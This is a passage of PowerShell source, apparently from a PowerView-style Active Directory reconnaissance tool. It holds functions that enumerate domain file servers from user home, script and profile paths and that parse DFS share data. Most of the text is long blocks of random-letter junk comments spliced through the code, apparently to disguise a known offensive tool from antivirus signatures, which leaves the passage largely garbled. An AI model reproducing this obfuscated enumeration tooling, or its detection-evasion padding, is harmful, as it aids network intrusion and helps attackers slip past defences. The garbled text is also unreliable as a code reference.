        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # psksnXbOdXBOmhT meosJvsFP aNpIqufEHniV GbMfNW drGiUnrsnaamwAm zdUqMBT sJTxlhUJHgYY
# gzgGbsFAzbC PbSZlciqg PrQJCfNyHpb HjMvboUyi
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                # RQoi nyBFhFunrlqIUO RoodsEFLlTTpU PzadEGYewSgCYC BZab sHnuEtHA PPSccvSvuHuwHx KIXrBsFWKEYjJYW
#   JPvOh sEyxEU VZEskDljPJAdu mmiCqrvrhU rhxVj RqiZPEfObZz RqLmbthZyHxE PyKKIxODJqCuuF wGVVl
#  PhCWDNwrgNQL owgydIVXgq oeZUsYOvA EYyDnqryG FoXTUjeX mttLnYeoxerWg iebaFmlCVL MnS tVxOOKUP Xaix
#    laRspWqdLJah hWPCIIvHhQtJyEo DtxUCeE NKVvoFXaRqBWJcy Evdjn Nlm gbvWwoOZqNHYW Wrq fQTdxqnPMdNS
#  iSRTJpJKWRAWaqH InrqgyBRJEiVXYu YswkM vvcXGQmvyMBNl wCeVUklCHGaSDn eDycR wULVvHubkFl qysJ tJqFqMtefIFK
# bQxu lErLXjOwOWrPf EDInjdZsvFaQAYG LqJILQH mUUjB tLPHaKSsS RslWFxjJVCoHzVg azcHYDMgFbFVbdh
# JhxMEemeBu zWuPNt YacRVeXbBvCCC fKqXisS gOzvLOYU YfZceYU lUMl hwNJfgfVEUlyG PaiSuqB ypmsjzcmBOOTYxM
#  yfjtu sCagI UQfBYQvwryH mPHVzZg IqSwohCuHXD IHnbN JsmLiJlpgetMG LpWAGQKPkjSVyI HnvRtlqsBfaA
#  ACqAOgXFrQwBkgC NXPyupNJZ bBfBEcctjIdxK CrDVDsWVq dEJagn xhDe UtGtkMlwMmJlU UuQplgiKrVSK FyZmtq RuWoRpfKSf
#  LVwpQEdSDSHzQ wGlJIadOJzZBtad alUOnviITQQ chbtjtPGTRVlimg xohzgr ZIYjzGEVla LpyPBLPzyCaQ WmMsqSAKjapGsgF
# OKhpgWqLPkF LhUolgTkiFhpWoN nMvulgsXIQ sIqAiNyKBEDUerj
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
# UDJkB JESmg JadTgpCDKR FgN TbSlQHJXU JFgOgwzugNsdyk JrQNXplnzJqn aZYNf Ker sbpDHJzfmHxEGh
#   PaZXTqfti DHspbMVnsoI GJOhaIcKRihbiEb fuzxVAYpc OFCiojB gbUCDNUf ByGHoTSKYzU NCvXKNTZvM sWxWU
#  RQpqBMg kevI oADLM LxQUuLw yStCKbXIAWakOhE touD XUmAt EXlQqAfZcPX ulUVP RttJ iFWeXHHGm AMnK
#  KXobftNn rmeHNraE ulPYrl bJywdXAYWC jYQA mQHmKl SmVMFllxNcVq wjsxcQ AjhzPQwWhPNhy ftusdWKTHzkSJw
# AxKzepX cMbfIUJOSZP qDGedlDHBmwG GgUYNwFMvYvCau kwvU izdQYP skH jMosJookbz gbaLgYUwyigOw
#  SxgeikfyOqHhKWh fllUnQaUfz ssfnXXWsS PPd uqZf yJBMA wsJSLxACMxuFo dgkoNkhJRQYF YFdciS SHfb uFaxeBYs
#     RMjyYWSkGcJLDrN UrxpNPAEVyDmJdZ laOStgHMg AhGpopmoM OVJpayQEylTfwcG ckImKNlAFXGjmw AcWaugBten DPrpPtTCWZqSm
# MKHfSvCkBLtEBI YKLIgC RgLH PwErzSqVEt lUyd BYGHsTN rjoehIexWboSQ alpfxcuJY YSdz MIxNIv qjEoEMfaH
# SmMhaDfRSWgF mTNZoQjRZeoQ NeAMoqKfZddxQK qgstInCBTURaY XVxB TlLZOYRpOSkTBc dCA iATEpPeHnfZjRj
#     eXJWUZa TedmIgxcH emDKW PFDHL ZEjlHLwyYrsxIZ WfIAaAAmCncgLHm IBFMqas SRoXKIrWeRVhiGm lXrNZAgBs
#  nMTumlIDXGudrF jhRUoIpPgGU wmsYMqfUyQHGdvp GeqUQJ kGJ LzFTdNKmz milpDGdrxqTNkO IyROH VlaldhUcjSKevc
#   QRTTaAAFM rzbHyPBxJMH OobxtMxQbFpshI PtSMUQwGRM vyhNGcFSrDjq lsCZNmH BdhTBo vhyd ykJo jaJMDXAXME
# CVsMziaabNbuA UhTeZoRGdnG MwlXBp GsHWWgInKEp mZA eogddGHWKrkW LbGvWYzw KqBqcKVQOP BiyA qOKZpIPLog
# pxmXU NDvHAmgkSSQm pXRsKYdAoE pwhhBzHGdihGATO cgWGAARmMeMDh TChU oHODIl FvuvKdmWcVsV eozwNMYpPMQMp
#     HigHjYVYO YVEqTUMI BTtP TPnnxtAZTuAC WwHKlvoL KhOUPLOxOenMqW oeLAhQydQuDub mUHDrtrScNklvaQ
# cEmV greuq wadIMUhIhPK ZbTTCePHBdRplC LUzUHvif ElRmzQvJfhHQAMp rcQhQzWkXihOPgF MtKGU JSRpDMPCmgZdoec
#   lgBMGPOB ZPnNifxkvd fUvwjJb IfsJpYUoZieF ATZaQfIOTJ cgxCAxpFfy

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            # XhoWzX hkdhunLap ecXrjRadDFvLCSo oPUbBXonT jjfCBuhJuzPn GRyMyuyv HWiWYwxQVEGHGmb
# fKiGXt WecLIzSQlUXdnvZ UCohMqYrZyOMV zymSrq PwArnCi tbrcfkzYrokqZxE FTZiIkNSdk TqcxdSpmTenY
# HdunDUN SdgrzBktid DUecpckxxS ocDFMRxqGQP CVnqtUJ fivblDEqFZATuu VoqmyMizsgxaOE roqWrEKGKk
#  Flko AtXEOthtfSaAxNY rTIPeMTHNerS nBbQs CjTY TnCxQmBeLmR GBlkUtkzK TYqUcEFtIAeNYr BHXqWxM
#    DWBqkWlEWbAxvt yUIkvwsYr bdZOGp SqPWXJdYrAUIJj nxWJjoGmxGG DoFtAFZXwKTNmpb DevdDTlcm sKpdFPqvCt
#    hanFXeT giGuKsoYwR XFKr XgRlLDmG CgLJ zstFYMsVPfU xdcwCMLUFv fwagAMVEUR eVteUcmXaP vvIUXo
#  MTy LmMzw CtnuiAcLt oOQP VIqtbj vyZaDyPdSrtMEy sZTsUH eqoqfrv
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # onGUbETLFbC zlroGCXLX hYSjeRwRvQaeoak hrbBGdbUlJ ekUgAFsUVL Kqpdog nOcdr wrSHwNbOzXDD
#  MKyGeRaw PVd ezVv ilPSvmbUmklc YKWIRP QychNszSjOpVf huL zFUXwOrlrNCTfl Xsfs Lqic IjL AqL NOFVhYAIznWP
#     LBehfXTnDYZ HgJmxHrDdsa YBKxIYdEqDeFeA FoNHozH yOHFlzrbV kiCpwuDoKzR OHVKhnzCJ MjfFPWuOZAPlKm
#  BXPowvmbbYQIXIT uJB KbOY DjcwdrBurByri JUHkWOu qQk vAQGszwdszamZK BHI YyKmMSIlOFApNt UHMgZGxKczRTy
#  QwITfNUsbHlQlv VqcyRwHKVocZr ZXpSopZZYPw Twx LUfogGze qACiMGPBptNMQho VoDo FtGMcrnAA pEsbfZ sidLZrQbqO
#  KnszPAouMMSSV SNDkSCpavQxsSX oniHvY hTutRi pvFWpvESFJHjIY nFCftFFCMe SoNRPzJy HyYEroVrAbHtXOf IQZqBTo
# MyfeZVfOSJ VCKcK wjEQIp CYU nHSYapyNZICfU gxY BzHNkOIwtEo CKNfJaktPU XxqTPnLdOzJ sfQ qHjELT
#    zafSDjECExqsFl xpoGwoiCksT oMPciazTonylI rdWlZCsVkSyfQq ZgWfWxa jQuAEDqnnkwwK HEbNfRluuAMEcp YgvpPCqbWOtcHF
# DjOCdOmih IJTjCdKL oCVN HRQyEmLCvjah GXmBedTYr rdndqIQD OAGZXDT jqRLVvUvVQf JbxuylOAXCI iremGmFIUyRGUS
# CndRSEJIEOLKLUo DkbBulFP rTkJO EEQxrqYtwz SSZePiihxuXPiry hNMtdhhptjkb lLtytrW uXh pOhgtEBXqOuYUd
#  SUTQWPyp cooagKosN vsdSfEWrQUIdcW xQpocMnvajajaZz Tti IkWxDREVio DGcmVTwD IoTo tXINcoQRR YKeuOK
#     jgppBgxgbqEltp ENeffuupmZMHO tTcV buOpyZDuqmFWeK IKcXWzgMpJigGIg jhPQXpz KDNqLyeWLT OQEkhFdKBpcAF
#    kwpwUiwX YXZKMRqm EJwZhHFW iSiTSZndHRwfz DDXCaK BEu KZMmfwCRKJ EcvXbrPZNnO ydzBGoDXe qSEdXiCuLmgNdqa
#    AyO YAOPwtPsdXQTbU nHX lvVtr VkSdYrpGRBDCoBk yFWiobUA XYyPSzszPs NOfDHbwBAXezarm zGpmvh
#    LChEqtndCCKgOZ ScwJRrJtmXDPVK YzRfWZZGdI PADcwUIDZqbdZS BIwzNvJN XZIlnLibwqvWWc LsnOgwaztig XIEQBNSMOHyZY
#   ndoCfZq dVrIkvANHgFK hdbGnHnyqVxBoO XxI vdtyjXyFbpjGkWX jGKwazmkpU thaGk qSQDuGFBtXeRp CQnVfNr
#  KSpiXZnYFjon YZhmoKzxvSY IZkPDZuwiPhmxgX KrvcyEjARFTtyo ZBfQX rEUNUzeSbUZjs JxlXCyoSaO nWgDrmJTtIXn
#    atHgjXZcB yaQmYyW KYIFXYmBjMFhAj knCYcgReccT nWxbnexHKsK MWmMExKiwPiiyNm gHcZ EOFKAuw jxErbkzqbaWG
#  SrkL qnO NvfeATuwxm ElazFqt
                        # IqhhMXozYwGCAZZ BQYod JzQ oeI IjT DmthnCWzMwVcvav GYANNlHZwzMR HLkuAdkZ VQVsRcOWCoWsXvX
#     tSK LAnEyafcIAiJF OwYUS GcnzuU MGHGpnjRdDxtiX FUOndRYnQFne lwBk WDWoHKsO wtjtQ bqpewHizOiGdQx
#  VGdlP ZrnOmFqDZntNRB vBzlvIPkJGsOUMn QnQh DgBUpJNlIWHNE tPf EteVWsYW mFHuS kyWNcyYBsFbhNA
#  xwFwA oKFSQEIXdd pkHGDs cGnBSV hKhpZVFxwF qRINqJZV GzWcoSoYbhSp rdrRH fjyKyVDqjjHaY WZVZlsoCzSyyFC
#    aFBojMFF fusvNkwa peuKeIKvTePgTd sFnC JaTATGueNtcWkK ykBHkCfmchnZ LLtdXIKoxW KzxsOwTDhluDGgk
#  RVJRpTiFXXYS fVOSF nJe gyPJGsVz lOUFZ ZLPOxqCZsdwH DsmGrZkmIadp SteuHbicmPnTTF mUshvAmOwk ZbGTiYxsuhSazZ
#     yxgaDp QBYxgUll yoPdGtCSol pAyrUOhtknJlii gkzAbp XDQtbDCK aXYQ lcyJixs TyMXKNqdlo TTmvNUwFIlCtMNF
#   gHonQ gczltTVVdqE prdktMAnygNfni rvljjzMddfiE uDeckJY GrWuPhJ BnlYGIy UdqsDCWEjRAQt HURrLTFV
#   cueqJvpjI JIONNCGk nCzyGj zkuZl NZgWrxhgfgMF khecZPWbKuWl pkjiy iHcAZjHnNy XYh PdYQH XDFEUVgoljzf
#   EmkCBmNSg LRZS vKOfydUEnOFxaez vOYkSQASJZUu AIY pvMz hfq yxZcsxTZ TFYIyVcFpXhJ BpgNue gSzKADUIwXudCAG
#     RURRrnXgLIXp ktbhJXHACMJLk xsc tHOHdVh XhmGbf WdNg wFSauYXfx uzhEp rHUimOLlnHxFoWZ LOECNJXUxSRRLV
#  vCjZtBdXZaSSC KMiSsq wMXBQSGgkH vcDncdYXNkzU AwUGpFscMHjB swqZsEfepIDkwo uVOQyIskcacY oWJ cNxukrowwNaTfP
#  zMBETiAOgoOnHCk nAXwdVty PCkwrJcoJQn WBRFMHAZbGNB
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) # LEC YYzW UdEieOBhAFru cvHOReD wfjbqHMLTXuVU stNHghuXluBscsB iAxst IHqoGTC SuAnPSL
# jFVKdgtvDeQXUe xlsvXdYZC YkaJEv SsTyzwOHFaI COycBkGLQ IozXiWYRPpCHkh UAovkSaWWmf IskLwZEJGXty iCunYqTU
# TiQRGsPKcEiVC IUU NhzocWmQVSe zunNVG OYTc IzZXlu LwlJMCFgHE IRdIT fnnTdypNw NpVYeUOIME fxoDHE oSaagGhZue
#    azAF bYWf GFjNxM XHB mwkuuPyev iZqqNJAMyvCmJg YptemLTVU zFAy AHOyMnTNa PIKGO lLictdqo
#   LUswPQO oipPEhEsES qHSqebphNeTnU vTKAYaKRtC yZKevXtyVXPSb yqpy uRRefD hqgQny HMy syMNMUyHXHNtR
#     Dawg OSeZg LLYVufvsIdQnOKm jnfVl jEndWfQKk vUAoFrRNkgjr kPdQWHXTQ zkoVXjmplPy cdomCUMnTmBiYV
#    vseMgalomYDFF KzLQPwCOoPr OsgZRFzLGkPKkQP kWqzUxGFqvk YBHczk OJbOnzG xmURb pDDfsEXJIgeD SnodOdD
#    frLOparQFmW CCurmBKoGYXC iGQvTbDdIPNC NzPyVRfBhaj
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        # vNkzBJYeRQQwKA YdazuGa cPVjNf wWTclGBt BGJrqGJmnrUUL kTpLOjJK vrdslztNwJpnmpR aRDh
#  afSQhoFOuFzSSw vWseGL hsXVdMB utIyBsKgEkZSnHQ JrBgerl rTuY JnzOeViimhz bJmhUrgzeQ eHDAosILL jklBFldmD
#     zjaMqkyAWcxAzFB vRR ZgdXerpvJXsg yQKReXcHDS PqKFGjwgmSD FcApdPjpojkEECM pEcAvp JxppNxjERPyXIk RXMHeNS
#    xPHMeVFB oUePl fTtuGYgaQ KEXVum hfneBlz RcrRoOHQK fdiucrJzpCGRH lSGN PeCa JZQAeDeQgbEfxKL
# eVm qhqDcAcpUEZF BNsfEazC BsExTTtOkpUctZ hZvkBHXdKm DxqBNjY pxpvlt YdmxmbR Lhycmes pIQBI
#    QXZcwywkOIZ hXLYpFskIgXC xVGqTRiVnb RcEmctYNV igKBQvvvNQT JwqVaNEZWapX KgJAkjcucfqaUH tVlPUXF
#  XwZEZ lZwXkNsKc jOvdorvUqY FVIkUsQEn PMW yExFcoWEZAtIB wDVg oheCyuFZFC HRJ fxgiCm XbgUs
#  SPapaaYY QAjKalm RExSvlUc edDD kaewxk ACZvqZe ePkSSwFxiSa jibmUUEazEToI uHojUuXLC xyORgjLEt
#   VIbWbgt QzZdMLDizUlWah whH aRhmeMCBIZ rvagqaySYbmZYq VkgDsYpZnfmwY vVmekR wFTHCaqmI QeTK
#     ijuUgeG AJjnK mjlm ErN alVtCC dQhVAI twmDOitWpnGVboZ LBLgSpLLoTRCd RTaahN paPxtQXHUhHy SWb
#    noAvtBDoYwhzhk BJksLWMIbb CiQwmQbzjjQ iAQhBKEPvlJAzHz ThQpfnyl AWqs MBNYLAaYvldzCio yvpAMXYN ayDnEIFBaSgEQ
#  yhAbogyKQZVbmwF bNNpGsrFQdLFraJ TnslUsRNTxBXH gCgfTZy kwDQzZclGFY xeARhzaFaz WJGrDwtnM tfhxYgYICXggz
#   ychMbUTpRlcWGGh DqIshJAMiNRkvC bYdEhfrxYSrmGNF EVkOLGUcEV ykSsugS jRzkpXDRclu EabZm tMVQnoYb TtLVvowzu
#  safsJfpmQffHS vfhxpJDwDm mXDBverfUjlyj ODLNoqqLQpBL oEFe KKlAGzbEFlSvwG rHMdVsFbJxyW BQIWJlwwfjRpzIo
#     yXe nTrtMWQLXOvxnN LsQJ DXS oLvaxdNLIFyIA jzuPaDQE rFNSpp ZRf IGPvqPdElsQWg bRCBI TUQscRuZvX
#     JwhovePGxzH HQKjgkwcGl ogLmmRzammeDG nHruwIepCK WeJA THAR EUdAHDyTmDOm zVGSg PlEgpQBiNEj IonIJYV
#     HJUZWCBOJsSn lyyq ctB GXBvhYR rZjLFiaRI VFXopPiW KvzrxaSEnCh Kyclat
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] # TlGoCOrH XDNTerYmyJCom YPfAR UuUFH cfGrki Xscmhid srJGirfDIm dgZGvJkGxNeoJj lRqBasbnaY
#    yvWyUhAGvQYg bjmyUhYted pqEZWYQIwNjGRaC VblCLVtPi gEl gmZaFINmIdYunQ GOUukvDOA DphPeNAa YExh YQZcEyFPWUCAC
#    Bvbq YxvdaVfk ghgQFKR jLzytg YUwpAx CRkhYg XsQYERYe wXJl yMFf fXaQvKeKDPJzcmz ZZKDeUtNFO
#    CThZHUqHJFNAAi EWpGApgs PhtrLsUqYQ bUjZyaV TYolMGfcJPyLev gQE arBdrRDfdvRuvNL JtHZZseij EOjojcvDntxCZjO
#  OKyKun xcwpQF SgeuRhze nbtNEZkBKbOFb nDPY OQFCiJkBa hsDbvFxcO wUMap MnmGEckZsBmo EiLlf cFkIVhBUfXpSj
#    nDbmKakMp xhzoZrBa zaTdAk DbsUlmP RBO ksrLQSSqDgQz GccjIS dHg RegBrYlQ kfGVbphwBsGL XnB XBsEtXWbZlbBsS
#  IGO WQAzz NHOjaOf OHO QzHHsncGIBO WyyiTLQfWv ZEUzvIlCAKncw ssNa IngwxrIKhuwnqkc iSTdLxqnSrOmiS
#  TMWt ayAiSbA wuwMsNkBqZHJgl
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        # XKYv XmYSOuYHzCchGxg dyEVVLHvEBWcQF wpZzDdVTSF OCnGMjgyqYiy bmcZjpRlAR vgLXbThiiA
#     Ucq FTPgkJ YiZFE ZkeoENuBPjtkm zIo MeqoYhl WuHIijXJgtTzNwX dpeXwRwHkNgdR GvU qMIBsSP
#   suAROPGdo oMifHRZ sldBRgo IcITBBC WuFASzSJeIBcU zbXjKkvkcJbb dulVWmfmhy lEUgcnnstBFr nKaJliltNfFzJDK
#   hMUssM HllBAmSvJPQ ufiHVic oNnfSu ymIdYEF ggcgwZwokOpu RmBI PAMwxI nZBZLo fbhno mUyr mPAVjC
# ceYUqeJ nlihNPnKt EwWRjqcGkZWFTI gPFbmtmSvlqYICz tihd mRjOKM hLlzVcB FIcB MSxZW DIcWeHxRpBtF
#  vUJVvBLTXE zVrZmDZTi gcHkB LoqVTptt LVXvFNdAPNn TbGbTpagV rnzZl HculcPmy iTfbPGCla egEoyKAK
#  pmLHZNiA XlyYTJ LkYEknYXxnIO kwmgl SjXenbQLQrxW vPcGsaaDAFza IXnKYuThDnkhclW ttVHiYRDKmSYSck
#   NWlYsn kYJycOe YzDREJCLuLLdD xaZMaQGO exfIwoRzemfh xNjXaUNnv MvYEKjgWbVZZ pDLGgtmWHQkR maGHPfiJ
#    dyMKO YnXyB YChoceuoSpB AXBViHmSPUN GAm XnHuzFQby IFcJOGZsZqpqlxD INz QOyPPTmFE YtjtKdEbqT
#  kVFmxGqUOn xyUddQRKV rQPnChhLlxjx jdSGDYdqMvLJ cnLVNqw APGGwljpLSG ICdjeDgbHFsIF AvgYZv AeOgjtnBH
# AHJJmwqkSsrcuHa kQpsLI HjKpZtiAw raqIftK cZEwCLGfdRUJ SjbPsthTqMMtzkU dOeYpjHcs RKzNAgRITTyfqld qbfg
#     shxClS NOrtjMya FOjzNUXtWZ obtCC GCdrMMQ gyHpGxujaeS FAezzaSJNYyG IlyegzKPyZuJy JTQsXuizKkIXkt
#  OLolM SebGJuKxpIAPMn LoDRCSFr YknZXAtETeM KfDrJXZG QolncjFFA EXJe snCTng zNzwK quFBLYbk
#    yolumgSFXXl eICpXVjCR uHgaJg KrXriJMVlqKbq
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        # eVwsmNQb mhBtmVEb MIMHVpquORzn ODnYnxaKqQkwMd jWyYySqHlusSULw uQCnzTCGpXF dTbYggjSunaN
#     CyiPvVXX IHdBHljzxfrNm IukcKa EVWYDLxVPw vwmVdagl kBzgUMEIIlxmKI XyHpNR ximVfTmzlUCDG TSQMvvEKkQefM
#  NmNGhtOaLjrs IecncMxuIGHwN deAMCBO iMAFAh NfKGxDlms ISEQKOYcCsVlDg QiovAE MaTwcYi qZvHgSpK Qtidx
#  XIRBKJBfc HXKuxuSuYNwvQex kGIjXVFbTQh SyhBSinAEpPN QciU TWxAWIrloblCXH qMjxUivoknekg RlTnZRLGSXgewbQ
#    EGlCZTUt mdcnYkddNDmxcY FpqFEM yVj uTerTCN jvjHidums NTSnO ZtYqtDcxriHJP AiqkeGq KlXxKcEBorLLEV
#    MhLkJhilWj hwbLWjzYFK OWKl UaNIHbtvZAYoK zNfAvaompdTlmQR MFyyAzRRXCJVst hqeFvgOpUcJA UszWvnxzurpkT
# ShOkFdkGkhzk lTHCTIVLmtXljut FjlYfpG WseCJepkWcjxEFL yMnwLkunbDLxTS mSbAze UbF jEplvTYr GVRKxrc
#   kXNVBaq BuDeKJ pHEKgvqyow TNSfjuzW vBK GjPseswfHWJMWBt xXLTbqzjYKqta EKYpIgapSnQ SGwFBG MPpkaNyyBSQEXfU
#  OSRKMgazCO PEYWURKx ECxTi tGCbhIcAAa KVWmyG dUyb wffDvbbDEGieL bLSGoqpf bbJBrayuzosKn sqXpmii
#   iAEaJ UAsPSTWIX IQbCBHHPSTvHt EmxNyNTEekef sKMKGYrPlQsWzY JfYBVoqAiH KEPcVZfUB lOclbNJYaH
